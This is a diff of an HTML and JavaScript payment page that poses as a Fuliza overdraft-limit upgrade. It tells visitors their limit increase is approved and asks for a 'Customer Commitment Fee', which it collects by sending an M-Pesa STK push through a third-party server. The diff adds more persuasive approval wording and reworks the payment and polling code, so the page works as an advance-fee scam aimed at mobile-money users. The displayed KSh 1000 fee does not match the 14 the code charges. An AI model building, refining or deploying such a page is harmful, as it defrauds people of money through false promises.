@@ -7,46 +7,203 @@
 <style>
 *{box-sizing:border-box;margin:0;padding:0;}
 body{font-family:'Segoe UI',Arial,sans-serif;background:#f0f4f8;min-height:100vh;}
-.top-bar{background:linear-gradient(135deg,#1fb141,#16903a);padding:14px;text-align:center;color:#fff;font-weight:700;font-size:18px;box-shadow:0 2px 8px rgba(0,0,0,.15);}
+
+.top-bar{
+  background:linear-gradient(135deg,#1fb141,#16903a);
+  padding:14px;
+  text-align:center;
+  color:#fff;
+  font-weight:700;
+  font-size:18px;
+  box-shadow:0 2px 8px rgba(0,0,0,.15);
+}
+
 .page-wrap{max-width:430px;margin:36px auto;padding:0 12px;}
+
 .step-badge{display:flex;align-items:center;gap:10px;margin-bottom:16px;}
 .step-dot{width:28px;height:28px;border-radius:50%;background:linear-gradient(135deg,#1fb141,#16903a);color:#fff;font-size:13px;font-weight:700;display:flex;align-items:center;justify-content:center;}
 .step-line{flex:1;height:2px;background:#d4edda;}
 .step-label{font-size:12.5px;color:#888;}
-.invoice-card{background:#fff;border-radius:16px;box-shadow:0 8px 30px rgba(0,0,0,.1);overflow:hidden;margin-bottom:16px;}
-.invoice-header{background:linear-gradient(135deg,#1fb141,#16903a);padding:22px;color:#fff;}
+
+.invoice-card{
+  background:#fff;
+  border-radius:16px;
+  box-shadow:0 8px 30px rgba(0,0,0,.1);
+  overflow:hidden;
+  margin-bottom:16px;
+}
+
+.invoice-header{
+  background:linear-gradient(135deg,#1fb141,#16903a);
+  padding:22px;
+  color:#fff;
+}
+
 .invoice-title{font-size:16px;font-weight:700;}
 .invoice-limit{margin-top:10px;font-size:13px;}
 .invoice-limit span{font-weight:700;}
-.invoice-amount-row{display:flex;align-items:baseline;gap:6px;margin-top:18px;padding-top:16px;border-top:1px solid rgba(255,255,255,.25);}
+
+.invoice-amount-row{
+  display:flex;
+  align-items:baseline;
+  gap:6px;
+  margin-top:18px;
+  padding-top:16px;
+  border-top:1px solid rgba(255,255,255,.25);
+}
+
 .invoice-currency{font-size:20px;font-weight:700;}
 .invoice-amount{font-size:48px;font-weight:800;}
 .invoice-label{font-size:12px;}
-.instructions{margin-top:16px;font-size:14px;color:#555;line-height:1.5;}
-.pay-section{background:#fff;border-radius:16px;box-shadow:0 8px 30px rgba(0,0,0,.1);padding:24px;margin-top:20px;}
-.phone-wrap{display:flex;align-items:center;border:2px solid #ddd;border-radius:10px;overflow:hidden;}
-.phone-wrap.invalid{border-color:#e74c3c;}
-.phone-wrap.valid{border-color:#1fb141;}
-.phone-prefix{background:#e8f5e9;color:#1fb141;font-weight:700;font-size:16px;padding:13px 12px;border-right:2px solid #ddd;}
-.phone-input{flex:1;border:none;outline:none;padding:13px;font-size:16px;}
-.pay-btn{margin-top:18px;width:100%;padding:15px;background:linear-gradient(135deg,#1fb141,#16903a);border:none;color:#fff;font-size:16px;font-weight:600;border-radius:30px;cursor:pointer;}
-.spinner{margin-top:16px;display:none;flex-direction:column;align-items:center;}
-.loader{border:4px solid #f3f3f3;border-top:4px solid #1fb141;border-radius:50%;width:34px;height:34px;animation:spin 1s linear infinite;}
+
+.instructions{
+  margin-top:16px;
+  font-size:14px;
+  color:#555;
+  line-height:1.5;
+}
+
+.pay-section{
+  background:#fff;
+  border-radius:16px;
+  box-shadow:0 8px 30px rgba(0,0,0,.1);
+  padding:24px;
+  margin-top:20px;
+}
+
+.phone-wrap{
+  display:flex;
+  align-items:center;
+  border:2px solid #ddd;
+  border-radius:10px;
+  overflow:hidden;
+}
+
+.phone-prefix{
+  background:#e8f5e9;
+  color:#1fb141;
+  font-weight:700;
+  font-size:16px;
+  padding:13px 12px;
+  border-right:2px solid #ddd;
+}
+
+.phone-input{
+  flex:1;
+  border:none;
+  outline:none;
+  padding:13px;
+  font-size:16px;
+}
+
+.pay-btn{
+  margin-top:18px;
+  width:100%;
+  padding:15px;
+  background:linear-gradient(135deg,#1fb141,#16903a);
+  border:none;
+  color:#fff;
+  font-size:16px;
+  font-weight:600;
+  border-radius:30px;
+  cursor:pointer;
+}
+
+.pay-btn:disabled{
+  background: #a0cfa3;
+  cursor: not-allowed;
+}
+
+.spinner{
+  margin-top:16px;
+  display:none;
+  flex-direction:column;
+  align-items:center;
+}
+
+.loader{
+  border:4px solid #f3f3f3;
+  border-top:4px solid #1fb141;
+  border-radius:50%;
+  width:34px;
+  height:34px;
+  animation:spin 1s linear infinite;
+}
+
 @keyframes spin{to{transform:rotate(360deg);}}
-.status-msg{margin-top:14px;font-size:14px;font-weight:500;padding:10px;border-radius:8px;display:none;}
+
+.status-msg{
+  margin-top:14px;
+  font-size:14px;
+  font-weight:500;
+  padding:10px;
+  border-radius:8px;
+  display:none;
+}
+
 .status-msg.error{background:#fdecea;color:#c0392b;}
 .status-msg.info{background:#e8f5e9;color:#1a7a35;}
-.overlay{position:fixed;inset:0;background:rgba(0,0,0,.55);display:flex;align-items:flex-end;justify-content:center;opacity:0;pointer-events:none;transition:opacity .3s;}
+
+.overlay{
+  position:fixed;
+  inset:0;
+  background:rgba(0,0,0,.55);
+  display:flex;
+  align-items:flex-end;
+  justify-content:center;
+  opacity:0;
+  pointer-events:none;
+  transition:opacity .3s;
+}
+
 .overlay.show{opacity:1;pointer-events:all;}
-.popup{background:#fff;border-radius:22px 22px 0 0;width:100%;max-width:480px;padding-bottom:30px;transform:translateY(100%);transition:transform .4s;}
+
+.popup{
+  background:#fff;
+  border-radius:22px 22px 0 0;
+  width:100%;
+  max-width:480px;
+  padding-bottom:30px;
+  transform:translateY(100%);
+  transition:transform .4s;
+}
+
 .overlay.show .popup{transform:translateY(0);}
-.popup-header.success{background:linear-gradient(135deg,#1fb141,#16903a);padding:28px;text-align:center;color:white;}
-.popup-icon{font-size:30px;margin-bottom:10px;}
+
+.popup-header.success{
+  background:linear-gradient(135deg,#1fb141,#16903a);
+  padding:28px;
+  text-align:center;
+  color:white;
+}
+
+.popup-icon{
+  font-size:30px;
+  margin-bottom:10px;
+}
+
 .popup-title{font-size:20px;font-weight:700;}
+
 .receipt-body{padding:20px;}
-.receipt-row{display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid #eee;}
+
+.receipt-row{
+  display:flex;
+  justify-content:space-between;
+  padding:8px 0;
+  border-bottom:1px solid #eee;
+}
+
 .popup-actions{padding:20px;text-align:center;}
-.btn-proceed{padding:14px 24px;background:#1fb141;color:#fff;border:none;border-radius:30px;font-weight:600;cursor:pointer;}
+
+.btn-proceed{
+  padding:14px 24px;
+  background:#1fb141;
+  color:#fff;
+  border:none;
+  border-radius:30px;
+  font-weight:600;
+  cursor:pointer;
+}
 </style>
 </head>
 <body>
@@ -64,7 +221,7 @@ body{font-family:'Segoe UI',Arial,sans-serif;background:#f0f4f8;min-height:100vh
   <div class="invoice-card">
     <div class="invoice-header">
       <div class="invoice-title">Commitment Fee Invoice</div>
-      <div class="invoice-limit">Selected Fuliza Limit: <span id="limit">—</span></div>
+      <div class="invoice-limit">Selected Fuliza Limit: <span id="limit"></span></div>
       <div class="invoice-amount-row">
         <div class="invoice-currency">KSh</div>
         <div class="invoice-amount">1000</div>
@@ -74,20 +231,20 @@ body{font-family:'Segoe UI',Arial,sans-serif;background:#f0f4f8;min-height:100vh
   </div>
 
   <div class="instructions">
-    <p>Complete the <strong>Customer Commitment Fee</strong> to finalize your limit upgrade. Once payment is successful, your new Fuliza limit will be activated immediately.</p>
+    <p>Dear Customer, your Fuliza limit increase request has been approved. To finalize the upgrade, please complete the <strong>Customer Commitment Fee</strong> below. This confirms your request and allows our system to <strong>automatically refresh your current limit to the new limit you selected</strong>.</p>
+    <p>Complete this step to proceed to the <strong>final Fuliza limit activation stage</strong>. Once completed, your upgraded limit will be processed immediately.</p>
   </div>
 
   <div class="pay-section">
-    <div class="phone-wrap" id="phoneWrap">
+    <div class="phone-wrap">
       <span class="phone-prefix">254</span>
-      <input class="phone-input" id="phone" placeholder="7XXXXXXXX" maxlength="9" inputmode="numeric">
+      <input class="phone-input" id="phone" placeholder="7XXXXXXXX">
     </div>
 
     <button class="pay-btn" id="payBtn" onclick="payNow()">Pay KSh 1000 Now</button>
 
     <div class="spinner" id="spinner">
       <div class="loader"></div>
-      <div class="spinner-text">Sending STK Push…</div>
     </div>
 
     <div class="status-msg" id="statusMsg"></div>
@@ -112,120 +269,113 @@ body{font-family:'Segoe UI',Arial,sans-serif;background:#f0f4f8;min-height:100vh
 </div>
 
 <script>
-const BACKEND = "https://mpayafrica-server.onrender.com"; // your server.js backend
+const BACKEND = "https://mpayafrica-server.onrender.com"; // live server
 const COMMITMENT_FEE = 14;
+const selectedAmount = localStorage.getItem("selectedAmount") || "—";
+document.getElementById("limit").innerText = selectedAmount;
 
-const phoneInput = document.getElementById("phone");
-const phoneWrap = document.getElementById("phoneWrap");
-const statusMsg = document.getElementById("statusMsg");
-const spinner = document.getElementById("spinner");
-const payBtn = document.getElementById("payBtn");
+async function payNow() {
+  const phone = document.getElementById("phone").value.trim();
+  const status = document.getElementById("statusMsg");
+  const spinner = document.getElementById("spinner");
+  const payBtn = document.getElementById("payBtn");
 
-document.getElementById("limit").innerText = localStorage.getItem("selectedAmount") || "—";
-
-function validatePhone(val){
-  if(val.length===9 && val.startsWith("7")){
-    phoneWrap.className="phone-wrap valid";
-    return true;
-  }
-  phoneWrap.className = val.length ? "phone-wrap invalid" : "phone-wrap";
-  return false;
-}
-
-phoneInput.addEventListener("input", ()=>{
-  phoneInput.value = phoneInput.value.replace(/\D/g,"").slice(0,9);
-  validatePhone(phoneInput.value);
-});
-
-async function payNow(){
-  const val = phoneInput.value.trim();
-  if(!validatePhone(val)){
-    statusMsg.style.display="block";
-    statusMsg.className="status-msg error";
-    statusMsg.innerText="Enter valid Safaricom number starting with 7";
+  if (phone.length !== 9 || !phone.startsWith("7")) {
+    status.style.display = "block";
+    status.className = "status-msg error";
+    status.innerText = "Enter valid Safaricom number starting with 7";
     return;
   }
-  const fullPhone = "254"+val;
-  spinner.style.display="flex";
-  statusMsg.style.display="none";
-  phoneInput.disabled=true;
-  payBtn.disabled=true;
+
+  const fullPhone = "254" + phone;
+
+  // Disable button & show spinner
+  payBtn.disabled = true;
+  spinner.style.display = "flex";
+  status.style.display = "block";
+  status.className = "status-msg info";
+  status.innerText = "Processing payment...";
 
   let data;
-  try{
-    const res = await fetch(`${BACKEND}/api/stk-push`,{
-      method:"POST",
-      headers:{"Content-Type":"application/json"},
-      body:JSON.stringify({
-        amount: COMMITMENT_FEE,
+
+  try {
+    const res = await fetch(`${BACKEND}/api/stk-push`, {
+      method: "POST",
+      headers: {"Content-Type":"application/json"},
+      body: JSON.stringify({
         phone_number: fullPhone,
-        user_reference:"Commitment Fee",
-        payment_id:"commitment_fee"
+        amount: COMMITMENT_FEE,
+        user_reference: "Fuliza Commitment Fee",
+        payment_id: "commitment_fee"
       })
     });
     data = await res.json();
-  } catch(e){
-    spinner.style.display="none";
-    statusMsg.style.display="block";
-    statusMsg.className="status-msg error";
-    statusMsg.innerText="Server error. Try again.";
-    phoneInput.disabled=false;
-    payBtn.disabled=false;
+  } catch (err) {
+    spinner.style.display = "none";
+    payBtn.disabled = false;
+    status.style.display = "block";
+    status.className = "status-msg error";
+    status.innerText = "Server error. Try again.";
     return;
   }
 
-  if(!data.success){
-    spinner.style.display="none";
-    statusMsg.style.display="block";
-    statusMsg.className="status-msg error";
-    statusMsg.innerText=data.message||"Payment initiation failed";
-    phoneInput.disabled=false;
-    payBtn.disabled=false;
+  if (!data.success || !data.checkoutRequestId) {
+    spinner.style.display = "none";
+    payBtn.disabled = false;
+    status.style.display = "block";
+    status.className = "status-msg error";
+    status.innerText = data.message || "Payment initiation failed.";
     return;
   }
 
-  pollStatus(data.checkoutRequestId);
+  // Start polling
+  startPolling(data.checkoutRequestId, payBtn, spinner, status);
 }
 
-function pollStatus(checkoutRequestId){
-  let attempts=0;
-  const interval = setInterval(async ()=>{
+function startPolling(reference, payBtn, spinner, status) {
+  let attempts = 0;
+  const interval = setInterval(async () => {
     attempts++;
-    if(attempts>40){ // 2 min timeout at 3s interval
+    if (attempts > 40) { // ~2 minutes
       clearInterval(interval);
-      spinner.style.display="none";
-      statusMsg.style.display="block";
-      statusMsg.className="status-msg error";
-      statusMsg.innerText="Payment timeout. Please retry.";
-      phoneInput.disabled=false;
-      payBtn.disabled=false;
+      spinner.style.display = "none";
+      payBtn.disabled = false;
+      status.style.display = "block";
+      status.className = "status-msg error";
+      status.innerText = "Payment timeout. Please retry.";
       return;
     }
-    try{
-      const res = await fetch(`${BACKEND}/receipt/${checkoutRequestId}`);
+
+    try {
+      const res = await fetch(`${BACKEND}/receipt/${reference}`);
       const data = await res.json();
-      if(data.status==="success"){
+
+      if (data.success && data.status === "success") {
         clearInterval(interval);
-        spinner.style.display="none";
+        spinner.style.display = "none";
         document.getElementById("successOverlay").classList.add("show");
+        return;
       }
-      if(data.status==="failed"){
+
+      if (data.status === "failed") {
         clearInterval(interval);
-        spinner.style.display="none";
-        statusMsg.style.display="block";
-        statusMsg.className="status-msg error";
-        statusMsg.innerText=data.reason||"Payment failed";
-        phoneInput.disabled=false;
-        payBtn.disabled=false;
+        spinner.style.display = "none";
+        payBtn.disabled = false;
+        status.style.display = "block";
+        status.className = "status-msg error";
+        status.innerText = "Payment failed: " + (data.reason || "Unknown error");
       }
-    } catch(e){}
-  },3000);
+
+    } catch (e) {
+      // ignore intermittent fetch errors
+    }
+  }, 3000);
 }
 
-function goNext(){
-  window.location.href="payment4.html";
+function goNext() {
+  window.location.href = "payment4.html";
 }
 </script>
 
 </body>
-</html>
+      </html>
